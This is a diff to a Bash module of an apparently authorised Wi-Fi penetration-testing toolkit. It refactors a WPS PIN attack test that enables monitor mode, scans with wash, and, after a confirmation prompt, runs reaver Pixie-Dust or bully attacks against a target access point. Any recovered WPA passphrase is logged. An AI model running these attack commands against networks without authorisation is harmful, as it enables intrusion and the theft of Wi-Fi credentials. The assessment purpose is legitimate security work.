@@ -32,8 +32,33 @@
 set -uo pipefail
 
 run_d3() {
+    local interface=""
+    local bssid="${GUEST_BSSID:-}"
+    local ssid="${GUEST_SSID:-}"
+    local channel="${GUEST_CHANNEL:-}"
+    local evidence_dir="${SESSION_EVIDENCE_DIR:-}"
+
+    # Parse arguments
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --interface) interface="$2"; shift 2 ;;
+            --bssid) bssid="$2"; shift 2 ;;
+            --ssid) ssid="$2"; shift 2 ;;
+            --channel) channel="$2"; shift 2 ;;
+            --evidence-dir) evidence_dir="$2"; shift 2 ;;
+            *) shift ;;
+        esac
+    done
+
+    # Fallbacks to globals
+    interface="${interface:-${WIFI_INTERFACE:-}}"
+    bssid="${bssid:-${GUEST_BSSID:-}}"
+    ssid="${ssid:-${GUEST_SSID:-}}"
+    channel="${channel:-${GUEST_CHANNEL:-0}}"
+    evidence_dir="${evidence_dir:-${SESSION_EVIDENCE_DIR:-}}"
+
     local total_steps=6
-    local evidence_prefix="${SESSION_EVIDENCE_DIR}/d3"
+    local evidence_prefix="${evidence_dir}/d3"
     local findings_file="${evidence_prefix}_findings.txt"
     local wps_scan_file="${evidence_prefix}_wps_scan.txt"
     local attack_file="${evidence_prefix}_wps_attack.txt"
@@ -44,15 +69,18 @@ run_d3() {
 
     check_module_dependencies "D3" || return 1
 
-    if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
+    if [[ -z "$ssid" || -z "$bssid" ]]; then
         log_warn "Target SSID/BSSID not set."
         if ! select_target_network; then
             log_error "No target selected. Run A1 first or enter manually."
             return 1
         fi
+        ssid="${GUEST_SSID:-}"
+        bssid="${GUEST_BSSID:-}"
+        channel="${GUEST_CHANNEL:-0}"
     fi
 
-    log_success "Target: ${GUEST_SSID} (${GUEST_BSSID})"
+    log_success "Target: ${ssid} (${bssid})"
 
     local wps_enabled="false"
     local wps_locked="false"
@@ -66,7 +94,7 @@ run_d3() {
         echo "============================================================"
         echo "  D3: WPS PIN Attack Test"
         echo "  Date: $(date '+%Y-%m-%d %H:%M:%S')"
-        echo "  Target: ${GUEST_SSID} (${GUEST_BSSID})"
+        echo "  Target: ${ssid} (${bssid})"
         echo "============================================================"
         echo ""
     } > "$findings_file"
@@ -75,6 +103,8 @@ run_d3() {
     log_step 2 $total_steps "Enabling monitor mode"
     update_tc_progress 2 $total_steps "Monitor mode"
 
+    # Ensure interface is set for enable_monitor_mode
+    WIFI_INTERFACE="$interface"
     enable_monitor_mode || return 1
     local mon_iface="${MONITOR_INTERFACE}"
     log_success "Monitor mode active: ${mon_iface}"
@@ -96,17 +126,17 @@ run_d3() {
     # Run wash for a scan
     log_info "Running 30s WPS scan..."
     local wash_output
-    wash_output=$(timeout 30 "${TOOL_PATHS[wash]}" -i "$mon_iface" -s 2>/dev/null || true)
+    wash_output=$(run_fg --quiet timeout 30 wash -i "$mon_iface" -s 2>/dev/null || true)
 
     echo "$wash_output" >> "$wps_scan_file"
 
     # Check if target AP has WPS enabled
     local target_wps_line
-    target_wps_line=$(echo "$wash_output" | grep -i "${GUEST_BSSID}" || true)
+    target_wps_line=$(echo "$wash_output" | grep -i "${bssid}" || true)
 
     if [[ -n "$target_wps_line" ]]; then
         wps_enabled="true"
-        log_result "FINDING" "WPS is ENABLED on ${GUEST_SSID} (${GUEST_BSSID})"
+        log_result "FINDING" "WPS is ENABLED on ${ssid} (${bssid})"
         echo "FINDING: WPS enabled on target network" >> "$findings_file"
 
         # Parse WPS version and lock status
@@ -124,7 +154,7 @@ run_d3() {
         echo "WPS Locked: ${wps_locked}" >> "$findings_file"
         echo "Full scan line: ${target_wps_line}" >> "$findings_file"
     else
-        log_info "WPS does NOT appear to be enabled on ${GUEST_SSID}"
+        log_info "WPS does NOT appear to be enabled on ${ssid}"
         echo "INFO: WPS not detected on target network" >> "$findings_file"
     fi
 
@@ -151,6 +181,7 @@ run_d3() {
         echo "  ╚════════════════════════════════════════════════════════════════════╝"
         echo -e "${C_RESET}"
         echo ""
+        local confirm=""
         get_or_request_param "confirm" "  Proceed with limited WPS PIN attack? [Y/n]"
         if [[ "${confirm,,}" == "n" ]]; then
             log_info "WPS PIN attack skipped by user"
@@ -164,13 +195,13 @@ run_d3() {
                 echo ""
             } > "$attack_file"
 
-            if [[ -x "${TOOL_PATHS[reaver]}" ]]; then
+            if [[ -n "${TOOL_PATHS[reaver]:-}" && -x "${TOOL_PATHS[reaver]}" ]]; then
                 log_info "Starting reaver Pixie-Dust attack..."
                 local reaver_output
-                reaver_output=$(timeout 180 "${TOOL_PATHS[reaver]}" \
+                reaver_output=$(run_fg --quiet timeout 180 reaver \
                     -i "$mon_iface" \
-                    -b "$GUEST_BSSID" \
-                    -c "${GUEST_CHANNEL:-0}" \
+                    -b "$bssid" \
+                    -c "${channel}" \
                     -vv -K \
                     2>&1 || true)
 
@@ -196,12 +227,12 @@ run_d3() {
                     echo "CRITICAL: WPA PSK recovered via WPS: ${recovered_psk}" >> "$findings_file"
                 fi
 
-            elif [[ -x "${TOOL_PATHS[bully]}" ]]; then
+            elif [[ -n "${TOOL_PATHS[bully]:-}" && -x "${TOOL_PATHS[bully]}" ]]; then
                 log_info "Starting bully attack..."
                 local bully_output
-                bully_output=$(timeout 180 "${TOOL_PATHS[bully]}" "$mon_iface" \
-                    -b "$GUEST_BSSID" \
-                    -c "${GUEST_CHANNEL:-0}" \
+                bully_output=$(run_fg --quiet timeout 180 bully "$mon_iface" \
+                    -b "$bssid" \
+                    -c "${channel}" \
                     -d -v 3 \
                     2>&1 || true)
 
@@ -296,7 +327,7 @@ run_d3() {
     local is_secure=0
     [[ "$result_status" == "SECURE" ]] && is_secure=1
 
-    save_tc_result "D3" "$result_json" 1 1 $has_pri 1 1 1 0 1 1 1 $is_secure
+    save_tc_result "D3" "$result_json" 1 1 $has_pri 1 1 1 0 1 1 1 "$is_secure"
     save_session_state
 
     return 0
